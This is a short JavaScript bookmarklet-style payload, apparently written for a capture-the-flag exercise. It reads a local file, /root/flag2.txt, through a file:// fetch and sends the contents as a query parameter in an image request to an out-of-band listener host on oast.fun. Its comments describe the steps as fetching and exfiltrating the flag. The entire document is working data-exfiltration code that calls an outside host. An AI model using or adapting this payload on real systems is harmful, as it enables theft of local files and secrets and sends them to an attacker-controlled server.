javascript:(async()=>{
    // fetch the flag file off the local filesystem
    const txt = await (await fetch('file:///root/flag2.txt')).text();
    // exfiltrate it as a GET to your listener
    new Image().src = 'https://nntdfrlpiazffctldaru16pm4e7nex2p2.oast.fun/?flag=' + encodeURIComponent(txt);
  })()
